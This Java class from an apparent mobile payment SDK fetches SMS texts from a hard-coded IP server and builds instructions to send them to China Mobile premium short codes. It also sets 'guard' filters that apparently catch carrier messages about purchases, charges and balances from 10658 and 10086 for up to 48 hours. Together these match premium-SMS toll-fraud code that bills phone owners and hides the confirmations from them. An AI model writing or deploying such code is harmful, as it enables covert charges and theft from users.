package com.jxt.pay.appclient.service.dynamic.net;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Properties;

import org.apache.log4j.Logger;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.CommonUtil;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;

public class BjjsDynamicService implements IDynamicService{

	private static Logger logger = Logger.getLogger(BjjsDynamicService.class);
	
	private static final String TYPE = "bjjs";
	
	private static final String PARAM = "regist=0&version=1.0.0.7&pid={pid}&channelId={channelId}&chargeId={chargeId}";
	
	private static final String DEST1 = "10658422";
	private static final String DEST2 = "1065889923";
	
	private int timeOut = 60;
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final Guard guard1 = new Guard("10658","成功|购买|话费",2880,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("10658","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();
	
	@Override
	public String dynamic(Map<String, String> map) {
		String xml = null;
		
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String pid = map.get("pid");
			String channelId = map.get("channelId");
			String chargeId = map.get("chargeId");
			
			String param = PARAM.replace("{pid}", pid).replace("{channelId}",channelId).replace("{chargeId}",chargeId);
			
			String responseXml = GetData.getData(url, param);
					
			if(responseXml != null && responseXml.length() > 0 && !"null".equals(responseXml)){
				
				tryMap.remove(channel);
				
				try{
					xml = parseXml(map,responseXml);
				}catch(Exception e){
					return DynamicUtils.parseError("597");
				}
			}else{
				logger.info("responseXml is null");
				return DynamicUtils.parseWait(15,map);
			}
		}
		
		return xml;
	}

	private String parseXml(Map<String, String> map,String data){
		
		Properties prop = CommonUtil.getProp(data);
		
		String registSMS = prop.getProperty("registSMS");
		String chargeSMS = prop.getProperty("chargeSMS");
		
		if(registSMS != null && registSMS.length() > 0 && chargeSMS != null && chargeSMS.length() > 0){
			Sms sms = new Sms();
			
			sms.setSmsContent(registSMS);
			sms.setSmsDest(DEST1);
			sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
			
			Sms sms1 = new Sms();
			
			sms1.setSmsContent(chargeSMS);
			sms1.setSmsDest(DEST2);
			sms1.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
			
			Sms guardSms = new Sms();
			
			List<Guard> guardList = new ArrayList<Guard>();
			
			guardList.add(guard1);
			guardList.add(guard2);
			
			guardList.add(guard3);
			guardList.add(guard4);
			
			guardSms.setGuardList(guardList);
			
			StringBuffer sb = new StringBuffer();
			
			sb.append(XstreamHelper.toXml(guardSms));
			sb.append(XstreamHelper.toXml(sms));
			sb.append("<wait>60</wait>");
			sb.append(XstreamHelper.toXml(sms1));
			
			return sb.toString();
		}
		
		return null;
	}
	
	public static void main(String[] args){
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", "http://182.92.21.219:10789/cmcc/g/single/s2sEasyChargeSMS");
		map.put("pid", "6731458086-1042187632");
		map.put("channelId", "41412000");
		map.put("chargeId", "006056262004");
		map.put("channel","aa");
		
		String xml = new BjjsDynamicService().dynamic(map);
		
		System.out.println(xml);
	}
}
